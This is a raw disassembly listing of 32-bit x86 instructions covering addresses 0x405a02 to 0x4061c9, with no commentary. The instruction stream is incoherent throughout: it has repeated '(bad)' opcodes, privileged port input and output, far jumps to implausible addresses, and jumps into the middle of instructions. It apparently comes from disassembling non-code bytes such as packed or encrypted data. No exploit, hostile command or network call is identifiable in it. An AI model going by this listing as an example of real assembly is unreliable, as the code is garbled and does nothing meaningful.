  405a02:	add    edi,eax
  405a04:	pop    edi
  405a05:	popf   
  405a06:	inc    eax
  405a07:	das    
  405a08:	mov    bh,0xf6
  405a0a:	mov    ecx,DWORD PTR [ebx]
  405a0c:	xchg   edi,eax
  405a0d:	inc    ebp
  405a0e:	stos   DWORD PTR es:[edi],eax
  405a0f:	in     al,0x2
  405a11:	or     edx,edi
  405a13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a14:	js     0x4059cd
  405a16:	ja     0x4059df
  405a18:	inc    esp
  405a19:	mov    bh,0xf
  405a1b:	in     eax,0xa9
  405a1d:	retf   
  405a1e:	pop    ds
  405a1f:	pop    ebp
  405a20:	push   ds
  405a21:	mov    al,0x39
  405a23:	aaa    
  405a24:	(bad)  
  405a25:	and    ah,BYTE PTR [esp+eax*1-0x12205ce8]
  405a2c:	pop    edi
  405a2d:	fistp  DWORD PTR [edi-0x5b]
  405a30:	pop    eax
  405a31:	shl    BYTE PTR [ecx],0x50
  405a34:	adc    dh,BYTE PTR [edx-0x3a3dc856]
  405a3a:	lods   eax,DWORD PTR ds:[esi]
  405a3b:	retf   0x55bc
  405a3e:	mov    edx,0x8cac2610
  405a43:	daa    
  405a44:	in     eax,0x1e
  405a46:	rcr    DWORD PTR [edx-0xce924f7],0xd2
  405a4d:	int3   
  405a4e:	add    dl,bh
  405a50:	inc    ebp
  405a51:	adc    bh,BYTE PTR [eax]
  405a53:	cmp    eax,0xff6ef0c1
  405a58:	jnp    0x405a76
  405a5a:	mov    eax,DWORD PTR [eax]
  405a5c:	(bad)  
  405a5d:	mov    ch,0xde
  405a5f:	mov    ss:0xaa3a4aba,eax
  405a65:	push   cs
  405a66:	imul   esp,eax,0xffffffff
  405a69:	ja     0x405aa1
  405a6b:	mov    al,0xfb
  405a6d:	dec    edx
  405a6e:	int3   
  405a6f:	into   
  405a70:	add    DWORD PTR [eax+0x71],ebx
  405a73:	pop    ss
  405a74:	into   
  405a75:	pusha  
  405a76:	repz sub DWORD PTR [ebx-0x1bd132b7],0xcfd29814
  405a81:	xor    al,0xb1
  405a83:	(bad)  
  405a85:	sub    cl,BYTE PTR ds:0x98344094
  405a8b:	stc    
  405a8c:	push   esp
  405a8d:	(bad)  
  405a8f:	xchg   DWORD PTR [edx],edx
  405a91:	mov    al,0x40
  405a93:	pop    es
  405a94:	shr    dl,1
  405a96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a97:	cmp    eax,0x6fdf47d0
  405a9c:	jbe    0x405aad
  405a9e:	mov    edx,0x86a3140b
  405aa3:	push   es
  405aa4:	jnp    0x405b06
  405aa6:	add    eax,0x52d0ad8e
  405aab:	cmp    al,0xbc
  405aad:	gs mov edx,0xfb140940
  405ab3:	mov    ch,0xa2
  405ab5:	jg     0x405a95
  405ab7:	in     al,0xea
  405ab9:	push   cs
  405aba:	mov    edx,0xd8a5a66a
  405abf:	jecxz  0x405a45
  405ac1:	or     al,0x96
  405ac3:	popa   
  405ac4:	push   cs
  405ac5:	pushf  
  405ac6:	rol    BYTE PTR [ecx+0x18],cl
  405ac9:	mov    ebp,0x3e5a79cf
  405ace:	mov    BYTE PTR [ebx-0xc096c9e],bh
  405ad4:	loop   0x405ada
  405ad6:	les    esp,FWORD PTR [ebp-0x42d3d9ad]
  405adc:	gs jg  0x405aa1
  405adf:	sub    edi,DWORD PTR [edx+0x47]
  405ae2:	dec    ebx
  405ae3:	push   esp
  405ae4:	mov    esp,0xfa2961ca
  405ae9:	jno    0x405afb
  405aeb:	jmp    0x405b5b
  405aed:	xor    bl,BYTE PTR [esi-0x16]
  405af0:	mov    edi,0xb501f5d7
  405af5:	outs   dx,BYTE PTR ds:[esi]
  405af6:	sbb    eax,0xd3d0a703
  405afb:	mov    bl,0xa3
  405afd:	dec    esi
  405afe:	inc    ebx
  405aff:	pop    si
  405b01:	addr16 (bad) 
  405b03:	ins    BYTE PTR es:[edi],dx
  405b04:	enter  0x5659,0x53
  405b08:	sahf   
  405b09:	(bad)  
  405b0a:	fistp  WORD PTR [eax+0x5]
  405b0d:	inc    esp
  405b0e:	sbb    ebx,ebx
  405b10:	mov    al,ds:0xccc5ee6f
  405b15:	aam    0xd1
  405b17:	jb     0x405acf
  405b19:	addr16 add eax,0xee3eb06
  405b1f:	fdivr  DWORD PTR [ebx+0x5]
  405b22:	and    ecx,DWORD PTR ds:0xd97cf68a
  405b28:	push   edx
  405b29:	add    eax,0x82e98573
  405b2e:	sub    dh,BYTE PTR [edx]
  405b30:	aad    0x0
  405b32:	js     0x405b42
  405b34:	test   DWORD PTR [edx-0x29df103d],eax
  405b3a:	or     dl,BYTE PTR [bx+si+0x7b]
  405b3e:	jnp    0x405b47
  405b40:	(bad)  
  405b41:	mov    ?,WORD PTR [edx]
  405b43:	fidiv  WORD PTR [ebx+eax*1]
  405b46:	rcr    DWORD PTR [esi],0x86
  405b49:	xchg   BYTE PTR [esi],dl
  405b4b:	je     0x405bb6
  405b4d:	add    BYTE PTR [ebx-0xa454234],ch
  405b53:	pop    es
  405b54:	lds    ebp,FWORD PTR [esi+0x1725b6f1]
  405b5a:	or     DWORD PTR [eax+0x68],ebp
  405b5d:	daa    
  405b5e:	xor    al,0x52
  405b60:	arpl   WORD PTR [eax+eax*1-0x7d],dx
  405b64:	out    0xb2,eax
  405b66:	push   edx
  405b67:	pop    ds
  405b68:	jno    0x405be7
  405b6a:	add    dh,bh
  405b6c:	lock jecxz 0x405b0a
  405b6f:	pop    es
  405b70:	aaa    
  405b71:	sbb    DWORD PTR [esi+0x33f4adab],edi
  405b77:	test   al,0xd0
  405b79:	sbb    dh,BYTE PTR [edx]
  405b7b:	aad    0xe0
  405b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b7e:	sub    eax,0xb4cb2d2d
  405b83:	inc    eax
  405b84:	push   edi
  405b85:	(bad)  
  405b86:	ins    DWORD PTR es:[edi],dx
  405b87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b88:	mov    ?,WORD PTR [ecx+0xc310a83]
  405b8e:	push   ds
  405b8f:	mov    cl,0xf3
  405b91:	mov    cl,0x5b
  405b93:	xchg   ecx,eax
  405b94:	dec    ebp
  405b95:	outs   dx,BYTE PTR ds:[esi]
  405b96:	test   dh,0x4
  405b99:	outs   dx,DWORD PTR ds:[esi]
  405b9a:	arpl   WORD PTR [eax+esi*2+0x53],bp
  405b9e:	setl   dh
  405ba1:	dec    edi
  405ba2:	imul   esi,eax,0x5e
  405ba5:	dec    edi
  405ba6:	icebp  
  405ba7:	mov    ss,edi
  405ba9:	and    BYTE PTR [edx-0x40c602d],dl
  405baf:	sti    
  405bb0:	lea    edx,[eax]
  405bb2:	stos   BYTE PTR es:[edi],al
  405bb3:	sahf   
  405bb4:	les    eax,FWORD PTR [edi+0x33]
  405bb7:	ret    0xf1e7
  405bba:	and    ebp,DWORD PTR [esi-0x4f]
  405bbd:	pop    ds
  405bbe:	ret    0xe2ad
  405bc1:	pop    edx
  405bc2:	(bad)  
  405bc3:	adc    BYTE PTR [eax],0x31
  405bc6:	mov    ecx,0x50efa984
  405bcb:	scas   eax,DWORD PTR es:[edi]
  405bcc:	cld    
  405bcd:	out    dx,al
  405bce:	cmp    BYTE PTR [ecx],dh
  405bd0:	mov    bl,0xb5
  405bd2:	shl    BYTE PTR [edx+edi*4],cl
  405bd5:	mov    ch,0x6
  405bd7:	sbb    DWORD PTR es:[eax-0x261f97fd],edx
  405bde:	mov    ebp,0x744b3740
  405be3:	ror    BYTE PTR ds:[edx-0x42cf87e3],0xce
  405beb:	bound  ebx,QWORD PTR [esi-0x1c05d280]
  405bf1:	iret   
  405bf2:	ret    0x24ac
  405bf5:	cld    
  405bf6:	xchg   esi,eax
  405bf7:	rcr    DWORD PTR [esi-0x1a67a980],cl
  405bfd:	inc    ebp
  405bfe:	(bad)  
  405bff:	das    
  405c00:	in     eax,dx
  405c01:	inc    edx
  405c02:	fld    DWORD PTR [esi]
  405c04:	repz mov edx,0xe7b602bc
  405c0a:	add    eax,0xfd5f1fcf
  405c0f:	cmp    ebx,esp
  405c11:	jmp    0x58e8:0x6c73ec5f
  405c18:	(bad)  
  405c19:	call   DWORD PTR [ebx+ebp*1-0x69]
  405c1d:	test   BYTE PTR [esi-0x1075c728],bl
  405c23:	jecxz  0x405c67
  405c25:	dec    edx
  405c26:	cs mov al,bl
  405c29:	loope  0x405bb0
  405c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c2c:	jnp    0x405c18
  405c2e:	je     0x405c2d
  405c30:	mov    al,ds:0x428f9924
  405c35:	scas   eax,DWORD PTR es:[edi]
  405c36:	mov    ebx,0x8f9c8c77
  405c3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c3c:	bnd jae 0x405c3c
  405c3f:	pop    edx
  405c40:	or     BYTE PTR [edx],0x8a
  405c43:	or     DWORD PTR [edx],eax
  405c45:	cmp    ebx,DWORD PTR [edx]
  405c47:	nop
  405c48:	and    edx,DWORD PTR [eax+0x711eae7a]
  405c4e:	mov    al,0x21
  405c50:	push   ss
  405c51:	fimul  DWORD PTR [edi+0x5d]
  405c54:	adc    eax,0x457e6b12
  405c59:	in     al,dx
  405c5a:	add    DWORD PTR [esp+ecx*2],0x7d
  405c5e:	dec    esi
  405c5f:	mov    edx,0xe566aa08
  405c64:	imul   ecx,DWORD PTR [eax+0x5f],0x6e04b48
  405c6b:	pop    ss
  405c6c:	imul   edx,DWORD PTR [edi-0xdf08c87],0x830b418c
  405c76:	sub    dl,BYTE PTR ds:0x1b510f9
  405c7c:	inc    esp
  405c7d:	loope  0x405c21
  405c7f:	and    al,0x86
  405c81:	push   cs
  405c82:	outs   dx,BYTE PTR ds:[esi]
  405c83:	lahf   
  405c84:	shr    BYTE PTR [edx+0x4517b26],1
  405c8a:	(bad)  
  405c8b:	stc    
  405c8c:	lock sub ebp,esi
  405c8f:	and    DWORD PTR [edi-0x766d67a5],0xfe726f77
  405c99:	imul   esi,ebx,0x8a8aa29e
  405c9f:	add    dl,BYTE PTR [edi-0x5f5afc61]
  405ca5:	in     al,dx
  405ca6:	sbb    dl,dl
  405ca8:	or     al,0x6f
  405caa:	out    0x53,eax
  405cac:	iret   
  405cad:	mov    ecx,0x401efd11
  405cb2:	lahf   
  405cb3:	dec    ebp
  405cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cb5:	sbb    al,0x6f
  405cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb8:	lods   eax,DWORD PTR ds:[esi]
  405cb9:	sub    esp,DWORD PTR [edx+eiz*4+0x454bc200]
  405cc0:	and    BYTE PTR ds:0x479cdb4d,bl
  405cc6:	sahf   
  405cc7:	sub    cl,BYTE PTR [esp+ebp*1+0x7e707e29]
  405cce:	jp     0x405d17
  405cd0:	and    DWORD PTR [edi-0x769ed5b8],esp
  405cd6:	push   ecx
  405cd7:	push   0xaf2e7711
  405cdc:	push   esp
  405cdd:	retf   
  405cde:	and    eax,0x58cfba48
  405ce3:	pop    ecx
  405ce4:	mov    al,0xcf
  405ce6:	xchg   ebx,eax
  405ce7:	sahf   
  405ce8:	dec    edx
  405ce9:	push   0xffffffb6
  405ceb:	and    al,0xb2
  405ced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cee:	dec    ebx
  405cef:	jae    0x405d22
  405cf1:	in     al,0x6c
  405cf3:	cld    
  405cf4:	shr    BYTE PTR [edx-0x9],1
  405cf7:	out    dx,al
  405cf8:	pop    ss
  405cf9:	mov    ds:0x66fc8fa,eax
  405cfe:	mov    esp,0x5d05972b
  405d03:	xchg   BYTE PTR [eax+0x3b],dh
  405d06:	mov    eax,0x1257aa1c
  405d0b:	call   0x38e37155
  405d10:	std    
  405d11:	lea    edx,[esi+ecx*4]
  405d14:	repnz push ds
  405d16:	rcr    DWORD PTR [eax],1
  405d18:	and    esi,DWORD PTR [ebx-0x1d5f7f03]
  405d1e:	inc    ebx
  405d1f:	js     0x405d6a
  405d21:	aad    0x3
  405d23:	push   ss
  405d24:	leave  
  405d25:	and    BYTE PTR [eax],ah
  405d27:	push   eax
  405d28:	dec    eax
  405d29:	pop    edx
  405d2a:	sbb    dl,ch
  405d2c:	push   esp
  405d2d:	shl    ah,cl
  405d2f:	daa    
  405d30:	pop    ds
  405d31:	sub    ebp,DWORD PTR [ebp-0x4ac4f239]
  405d37:	cmc    
  405d38:	xchg   edi,eax
  405d39:	setl   BYTE PTR [eax-0x66d86c04]
  405d40:	dec    edi
  405d41:	inc    ecx
  405d42:	in     eax,dx
  405d43:	jle    0x405d79
  405d45:	mov    bl,0xf1
  405d47:	xlat   BYTE PTR ds:[ebx]
  405d48:	dec    ebx
  405d49:	or     BYTE PTR [eax+edi*8+0x6e],0xa2
  405d4e:	or     eax,0x1e521dbf
  405d53:	xchg   BYTE PTR [esi-0x1620a7cf],al
  405d59:	dec    esp
  405d5a:	repnz scas eax,DWORD PTR es:[edi]
  405d5c:	test   DWORD PTR [ebx],ebp
  405d5e:	shr    DWORD PTR [ebx],1
  405d60:	aad    0xcd
  405d62:	jae    0x405ce7
  405d64:	mov    BYTE PTR [esi+0x1e],cl
  405d67:	and    eax,0x3635f423
  405d6c:	jo     0x405d2e
  405d6e:	mov    ebx,0x904ccb84
  405d73:	jl     0x405d75
  405d75:	lock xchg ebp,eax
  405d77:	xchg   edx,eax
  405d78:	xchg   ebp,eax
  405d79:	push   0x3e75ab82
  405d7e:	jb     0x405df9
  405d80:	xor    DWORD PTR [eax-0x1b8b7883],0x7a
  405d87:	addr16 push esp
  405d89:	mov    eax,0xf46beff7
  405d8e:	aaa    
  405d8f:	out    dx,eax
  405d90:	inc    eax
  405d91:	jle    0x405d3b
  405d93:	lock in al,0x67
  405d96:	imul   edi,DWORD PTR [esi],0xd
  405d99:	dec    ebx
  405d9a:	adc    esi,DWORD PTR [ebx-0x51]
  405d9d:	mov    ebp,0x2163ddf0
  405da2:	or     al,0x19
  405da4:	jnp    0x405d4f
  405da6:	or     BYTE PTR [eax+0x7e71b337],cl
  405dac:	xor    ah,BYTE PTR [esi-0xd]
  405daf:	imul   ecx,esp,0x6eeb3e9f
  405db5:	mov    ah,0x7c
  405db7:	xor    DWORD PTR [esi-0x49],edi
  405dba:	fnstsw WORD PTR ds:0xf046e1a1
  405dc0:	cwd    
  405dc2:	popa   
  405dc3:	mov    esi,0xb6128522
  405dc8:	mov    esp,0x6645d868
  405dcd:	xchg   ecx,eax
  405dce:	jl     0x405e31
  405dd0:	lea    ebx,[esi]
  405dd2:	retf   
  405dd3:	ss sahf 
  405dd5:	pushf  
  405dd6:	xchg   edi,eax
  405dd7:	cmc    
  405dd8:	mov    edx,0x84e8213f
  405ddd:	fs scas al,BYTE PTR es:[edi]
  405ddf:	sbb    edi,ebx
  405de1:	out    dx,eax
  405de2:	inc    ebx
  405de3:	sub    ebp,DWORD PTR [ebp+ecx*1+0x5ab2f64f]
  405dea:	pushf  
  405deb:	outs   dx,BYTE PTR ds:[esi]
  405dec:	dec    ebp
  405ded:	xor    ebx,eax
  405def:	shl    DWORD PTR [ecx],cl
  405df1:	cmp    BYTE PTR [ebx],bh
  405df3:	stc    
  405df4:	bound  edi,QWORD PTR [ebp+0x2b]
  405df7:	adc    BYTE PTR [edx+0x52],cl
  405dfa:	mov    cl,0x89
  405dfc:	test   al,0x58
  405dfe:	push   ss
  405dff:	enter  0x197e,0x8a
  405e03:	add    eax,0xbb8633dd
  405e08:	outs   dx,DWORD PTR ds:[esi]
  405e09:	enter  0x6a9a,0xd2
  405e0d:	and    BYTE PTR [edx+0x7f],0x22
  405e11:	sbb    esi,0x7aa4dca8
  405e17:	leave  
  405e18:	cdq    
  405e19:	xchg   esi,eax
  405e1a:	mov    ecx,0xeb8f4122
  405e1f:	in     al,dx
  405e20:	sti    
  405e21:	stc    
  405e22:	out    0xe2,al
  405e24:	jmp    0x405dba
  405e26:	sbb    DWORD PTR [esi-0x37c5a7],edi
  405e2c:	and    edx,DWORD PTR [edi]
  405e2e:	test   BYTE PTR [esi],cl
  405e30:	pop    ds
  405e31:	mov    dl,0x26
  405e33:	mov    ecx,0xe13f3112
  405e38:	jo     0x405e90
  405e3a:	femms  
  405e3c:	sub    DWORD PTR [eax+0x4b],ecx
  405e3f:	pop    eax
  405e40:	xor    al,0x79
  405e42:	push   0xffffffe3
  405e44:	xchg   edx,eax
  405e45:	outs   dx,BYTE PTR ds:[esi]
  405e46:	add    ch,cl
  405e48:	sahf   
  405e49:	xor    BYTE PTR [edi-0x2f],al
  405e4c:	mov    eax,ds:0x45b6fad
  405e51:	inc    edi
  405e52:	test   BYTE PTR [edx-0x39],0xca
  405e56:	seta   BYTE PTR [ebp-0x16]
  405e5a:	sbb    eax,0x181fd4f0
  405e5f:	pop    eax
  405e60:	iret   
  405e61:	and    DWORD PTR [edi],ebx
  405e63:	push   ss
  405e64:	jle    0x405e63
  405e66:	xor    esp,edx
  405e68:	std    
  405e69:	(bad)  
  405e6a:	adc    al,0x9d
  405e6c:	jmp    0x405e71
  405e6e:	push   ds
  405e6f:	outs   dx,BYTE PTR ds:[esi]
  405e70:	and    DWORD PTR [esi],edi
  405e72:	jb     0x405e1f
  405e74:	retf   
  405e75:	jbe    0x405e76
  405e77:	adc    dh,BYTE PTR [esp+edi*4-0x5554d48]
  405e7e:	dec    ebp
  405e7f:	jns    0x405e67
  405e81:	arpl   WORD PTR [edx-0x22764e53],si
  405e87:	jb     0x405e5d
  405e89:	shl    DWORD PTR [esi+eax*4+0x52],0x6b
  405e8e:	ins    BYTE PTR es:[edi],dx
  405e8f:	lea    esp,[eax-0x7b]
  405e92:	aam    0xd1
  405e94:	mov    esi,0x1ade504c
  405e99:	ds test al,0xba
  405e9c:	xor    DWORD PTR [ecx+0x4acb4c44],eax
  405ea2:	xchg   ecx,eax
  405ea3:	xchg   DWORD PTR [ebp+ebp*4-0x4b439354],esi
  405eaa:	xchg   ebx,eax
  405eab:	in     al,0x79
  405ead:	push   0xe
  405eaf:	xor    ecx,edi
  405eb1:	in     al,0x16
  405eb3:	cmp    al,bh
  405eb5:	stos   BYTE PTR es:[edi],al
  405eb6:	or     eax,DWORD PTR [eax+0x1c]
  405eb9:	mov    ds:0xcdbb279f,eax
  405ebe:	xor    ah,0x3d
  405ec1:	pop    ss
  405ec2:	(bad)  
  405ec4:	rcr    edi,cl
  405ec6:	test   cl,ah
  405ec8:	and    eax,0xda1b868c
  405ecd:	arpl   WORD PTR [edi],di
  405ecf:	das    
  405ed0:	test   eax,0x2ceaadce
  405ed5:	jb     0x405ec7
  405ed7:	push   eax
  405ed8:	adc    eax,0x6957d9b4
  405edd:	popa   
  405ede:	fmul   DWORD PTR [ebx]
  405ee0:	je     0x405f28
  405ee2:	xchg   DWORD PTR [ecx-0x7e2b3ab8],edi
  405ee8:	mov    al,ds:0x9b3ca3ee
  405eed:	lods   eax,DWORD PTR ds:[esi]
  405eee:	andps  xmm4,XMMWORD PTR [edi-0x74]
  405ef2:	or     DWORD PTR [edx+0x4bf62c44],ebp
  405ef8:	or     al,BYTE PTR [esi-0x39de1170]
  405efe:	rcl    BYTE PTR [eax-0x28],cl
  405f01:	(bad)  
  405f02:	mov    BYTE PTR [ecx+0x71037077],0x99
  405f09:	xchg   esi,eax
  405f0a:	mov    eax,ds:0x72e3d643
  405f0f:	push   edx
  405f10:	adc    eax,0xc5c80318
  405f15:	add    eax,0x1e63deea
  405f1a:	mov    ebp,0x721e959a
  405f1f:	in     eax,dx
  405f20:	pop    eax
  405f21:	dec    esi
  405f22:	loopne 0x405f85
  405f24:	fistp  QWORD PTR [eax-0x1adcbea5]
  405f2a:	stc    
  405f2b:	pusha  
  405f2c:	test   DWORD PTR [esi+0x7e],edx
  405f2f:	jae    0x405f3b
  405f31:	pop    edx
  405f32:	les    esi,FWORD PTR [edi-0x689c1cf1]
  405f38:	pop    ecx
  405f39:	mov    ebp,0x729e6d7f
  405f3e:	imul   edx,DWORD PTR [esi+esi*8-0x70],0xffffffb2
  405f43:	adc    edx,DWORD PTR [eax]
  405f45:	pop    ebp
  405f46:	in     eax,dx
  405f47:	leave  
  405f48:	test   DWORD PTR [ebp+0x9],esi
  405f4b:	aas    
  405f4c:	lahf   
  405f4d:	mov    dl,0xac
  405f4f:	neg    DWORD PTR [ecx]
  405f51:	repz cmp DWORD PTR [eax-0x48],0xffffffdd
  405f56:	inc    ebp
  405f57:	ja     0x405edb
  405f59:	mov    DWORD PTR [ebx+0x2],edi
  405f5c:	pop    esp
  405f5d:	shl    BYTE PTR [ebx],1
  405f5f:	stos   BYTE PTR es:[edi],al
  405f60:	push   ebp
  405f61:	in     al,0xc8
  405f63:	inc    ebx
  405f64:	test   eax,0x632b940d
  405f69:	pop    edi
  405f6a:	adc    esi,ebx
  405f6c:	pop    ebx
  405f6d:	iret   
  405f6e:	fstp   DWORD PTR [edx+0x55]
  405f71:	add    eax,0xab8cb78a
  405f76:	push   0x77
  405f78:	mov    esp,0xdd0b041f
  405f7d:	stc    
  405f7e:	jns    0x405f3e
  405f80:	lock and edx,DWORD PTR [esi-0x7]
  405f84:	lods   eax,DWORD PTR ds:[esi]
  405f85:	cmp    edx,esp
  405f87:	inc    ebp
  405f88:	fs add ecx,edi
  405f8b:	daa    
  405f8c:	inc    ecx
  405f8d:	adc    DWORD PTR [ecx],esp
  405f8f:	outs   dx,DWORD PTR ds:[esi]
  405f90:	or     DWORD PTR [eax-0xb],0x7
  405f94:	fdivr  st,st(4)
  405f96:	add    eax,0x43e35351
  405f9b:	dec    esi
  405f9c:	(bad)  
  405f9d:	in     eax,0x7b
  405f9f:	ror    ebp,0x14
  405fa2:	adc    esp,DWORD PTR [ecx]
  405fa4:	inc    esi
  405fa5:	arpl   ax,sp
  405fa7:	sub    BYTE PTR [ecx+0x78],bl
  405faa:	push   ebx
  405fab:	xchg   bp,ax
  405fad:	and    ebx,DWORD PTR [ebp-0x6]
  405fb0:	or     bh,dl
  405fb2:	fcmovnu st,st(6)
  405fb4:	fstp   TBYTE PTR [ebx+esi*1]
  405fb7:	fs mov ebx,fs
  405fba:	and    BYTE PTR [ecx-0x181ba542],ch
  405fc0:	iret   
  405fc1:	cmp    eax,0x7a86ead3
  405fc6:	call   0x98ddb5cb
  405fcb:	in     al,dx
  405fcc:	jo     0x405fb9
  405fce:	pop    ecx
  405fcf:	ds pop ss
  405fd1:	mov    ds,WORD PTR [esi+esi*4+0xbade5e3]
  405fd8:	sub    cl,dl
  405fda:	add    eax,0xae30359
  405fdf:	mov    ah,0x96
  405fe1:	sbb    ebx,DWORD PTR ds:0x63711b8a
  405fe7:	loop   0x405fdc
  405fe9:	dec    edx
  405fea:	mov    ah,0x57
  405fec:	mov    dh,0x72
  405fee:	jnp    0x405fea
  405ff0:	test   al,0x54
  405ff2:	mov    ?,WORD PTR [ecx-0x34]
  405ff5:	ss repnz sub eax,0xc4af40e0
  405ffc:	sti    
  405ffd:	dec    ecx
  405ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fff:	cmp    esp,ebx
  406001:	mov    al,ds:0xbf7e1abe
  406006:	loopne 0x405ff8
  406008:	adc    bh,BYTE PTR [edx+0x64]
  40600b:	test   eax,0x706b0826
  406010:	mov    ebx,edi
  406012:	xchg   ebp,eax
  406013:	jmp    0x406062
  406015:	jae    0x406096
  406017:	les    ebx,FWORD PTR [eax+0x1f7faabf]
  40601d:	jge    0x406012
  40601f:	sar    DWORD PTR [ebx-0x62],cl
  406022:	mov    ebp,0xfac9cb37
  406027:	mov    eax,0xe21aecfa
  40602c:	sub    DWORD PTR [ebx],ebx
  40602e:	sti    
  40602f:	cmp    ah,dh
  406031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406032:	fdivr  st,st(5)
  406034:	xchg   ebx,eax
  406035:	dec    esi
  406036:	fisttp QWORD PTR [edx]
  406038:	mov    fs,WORD PTR [ecx-0x12]
  40603b:	fcom   QWORD PTR [edx+edi*1-0x5d7c6a16]
  406042:	xor    eax,0x1dc6b562
  406047:	or     BYTE PTR [edi],dl
  406049:	mov    ebx,0x7b3dfb18
  40604e:	hlt    
  40604f:	xor    edx,DWORD PTR [esi]
  406051:	ror    BYTE PTR [ebp+eax*4-0x6c541f82],1
  406058:	sti    
  406059:	(bad)  
  40605a:	mov    al,0x29
  40605c:	call   0xfc63:0x48671c2b
  406063:	xchg   ecx,eax
  406064:	repnz and BYTE PTR [edx+0x3],cl
  406068:	push   ebx
  406069:	inc    ebp
  40606a:	or     al,0xa6
  40606c:	gs xchg edi,eax
  40606e:	(bad)  
  40606f:	into   
  406070:	ja     0x40606e
  406072:	xchg   esp,eax
  406073:	xlat   BYTE PTR ds:[ebx]
  406074:	xor    ebx,DWORD PTR [eax-0x21cae275]
  40607a:	mov    bl,0x95
  40607c:	or     al,0xff
  40607e:	popa   
  40607f:	pop    esi
  406080:	mov    cl,BYTE PTR [eax-0x4b32adf1]
  406086:	and    DWORD PTR [ecx-0x17381894],ebp
  40608c:	icebp  
  40608d:	scas   al,BYTE PTR es:[edi]
  40608e:	or     bl,BYTE PTR [edx]
  406090:	mov    cl,0x6a
  406092:	pop    eax
  406093:	and    al,0x7c
  406096:	and    cl,BYTE PTR [ecx]
  406098:	ins    BYTE PTR es:[edi],dx
  406099:	stos   DWORD PTR es:[edi],eax
  40609a:	xchg   edi,eax
  40609b:	popa   
  40609c:	or     eax,0xae85f2a6
  4060a1:	dec    edi
  4060a2:	xchg   ebp,eax
  4060a3:	jae    0x406083
  4060a5:	call   0x6dd6f95a
  4060aa:	mov    ah,0x75
  4060ac:	cmpxchg eax,ebp
  4060af:	nop
  4060b0:	inc    ebx
  4060b1:	arpl   WORD PTR [esi+0x33],di
  4060b4:	jno    0x406069
  4060b6:	jbe    0x4060d5
  4060b8:	rcr    BYTE PTR [eax+edx*8-0x1df66846],cl
  4060bf:	jp     0x40604b
  4060c1:	js     0x406062
  4060c3:	cmp    cl,BYTE PTR [edi+eiz*2]
  4060c6:	mov    ecx,0x9fe7c510
  4060cb:	imul   ebp,DWORD PTR [edi-0x220e431],0x41
  4060d2:	mov    bl,0x38
  4060d4:	dec    esp
  4060d5:	cmc    
  4060d6:	scas   al,BYTE PTR es:[edi]
  4060d7:	hlt    
  4060d8:	test   eax,0x1a5e99b9
  4060dd:	fnstcw WORD PTR [ecx-0x52fd4eef]
  4060e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060e4:	sub    cl,BYTE PTR [eax+0x1a]
  4060e7:	fst    QWORD PTR [ecx-0x7e]
  4060ea:	jmp    0xf42a75fe
  4060ef:	add    al,0xa0
  4060f1:	dec    ebp
  4060f2:	or     ah,ch
  4060f4:	callw  0x2dd1
  4060f8:	sub    ebp,0xa4ccc952
  4060fe:	jo     0x40613d
  406100:	or     DWORD PTR [edx+0x1c2cff56],0x1368be4c
  40610a:	leave  
  40610b:	addr16 inc esi
  40610d:	and    al,0x22
  40610f:	test   dl,al
  406111:	or     bh,BYTE PTR [edx]
  406113:	daa    
  406114:	retf   
  406115:	std    
  406116:	dec    eax
  406117:	pop    edx
  406118:	fdiv   QWORD PTR [ebx]
  40611a:	mov    ah,0x77
  40611c:	mov    ebp,0x47040b35
  406121:	jo     0x4060a8
  406123:	mov    ecx,0xf4bb27b6
  406128:	lods   al,BYTE PTR ds:[esi]
  406129:	inc    eax
  40612a:	stc    
  40612b:	arpl   WORD PTR [edi+0x42],sp
  40612e:	add    eax,0xb1ffe212
  406133:	or     eax,0x7a9aeaf1
  406138:	push   ebp
  406139:	xor    DWORD PTR [edi+0x376271fa],edi
  40613f:	clc    
  406140:	clc    
  406141:	or     eax,0x22e96db
  406146:	and    al,0xad
  406148:	mov    ebp,0xec692b07
  40614d:	fcom   DWORD PTR [edx+0x2f]
  406150:	pop    edi
  406151:	fs jo  0x4060eb
  406154:	jbe    0x4061be
  406156:	jmp    0x51f9:0x8aadcdf6
  40615d:	int3   
  40615e:	lods   eax,DWORD PTR ds:[esi]
  40615f:	jae    0x4061af
  406161:	mov    esi,0x5dad8cbb
  406166:	cli    
  406167:	call   ecx
  406169:	iret   
  40616a:	mov    cs,WORD PTR [eax+0x28]
  40616d:	mov    bl,0xc0
  40616f:	dec    edi
  406170:	aad    0xe7
  406172:	sub    DWORD PTR [esi+0x6],ebp
  406175:	test   BYTE PTR [edx+0x43e1bf32],bh
  40617b:	outs   dx,DWORD PTR ds:[esi]
  40617c:	(bad)  
  40617d:	fild   DWORD PTR [edx]
  40617f:	popf   
  406180:	sbb    DWORD PTR [eax],ecx
  406182:	addps  xmm0,XMMWORD PTR [edx]
  406185:	adc    eax,0xa823873
  40618a:	fcom   DWORD PTR [edx]
  40618c:	into   
  40618d:	cmp    al,BYTE PTR [edx-0x38]
  406190:	loope  0x406139
  406192:	or     DWORD PTR [ecx+0x408989dd],ebx
  406198:	or     BYTE PTR [esi],0x93
  40619b:	or     ecx,DWORD PTR ds:0xec7a1073
  4061a1:	dec    esp
  4061a2:	lahf   
  4061a3:	add    ah,0x9
  4061a6:	icebp  
  4061a7:	jne    0xb008363b
  4061ad:	cmp    eax,0x4767f6a1
  4061b2:	pop    ebx
  4061b3:	dec    esi
  4061b4:	loope  0x406168
  4061b6:	jl     0x4061c9
  4061b8:	cmp    al,0x38
  4061ba:	pop    ss
  4061bb:	xchg   esi,eax
  4061bc:	cli    
  4061bd:	loop   0x406141
  4061bf:	mov    ?,WORD PTR [esi]
  4061c1:	icebp  
  4061c2:	adc    DWORD PTR [ecx+0x6207dd98],ecx
  4061c8:	pop    es
  4061c9:	push   ecx
